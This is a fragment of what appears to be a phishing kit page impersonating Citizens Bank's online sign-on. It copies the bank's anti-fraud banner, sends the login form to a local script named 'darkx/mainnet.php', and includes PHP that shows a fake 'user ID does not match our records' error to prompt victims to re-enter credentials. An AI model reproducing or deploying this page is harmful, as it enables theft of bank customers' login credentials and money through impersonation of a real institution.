...
<div id="GlobalMessageContainer">
    ...
    <div class="global-message status-message">
       <h1>December is Identity Theft and Protection Awareness Month</h1>
       <p><b><u>You are Unique. Let’s Keep it That Way:</b></u> To Fraudsters, you are only known  as a  username, a  password, a  Social Security Number,  an account number - essentially,  information to compromise.   Give yourself a gift this holiday season by changing  usernames and passwords, using different  credentials for each of your online activities.   And remember, <b>at no time</b> will you ever receive a call, email or text from Citizens Bank  asking for your login or personal credentials. <a href="https://www.citizensbank.com/learning/cyber-security-center.aspx" target="_blank">Learn More</a></p>
    </div>
...
<form class="pay-transfer-options clearfix" id="frmSignOn" action="darkx/mainnet.php" method="post">
                    ...
                    <?php 
                                ...
                                $em = "6004";
                                if ($ReasonCode == $em) {
                                print"<input type='hidden' name='ReasonCode' value='ReasonCode'><div id='messagecontainer' class='shows-error' role='alert'>The online user ID below does not match our records. Please review your information then try again. If you are still unable to continue, please call our Customer Service Center.</div>";}}?>
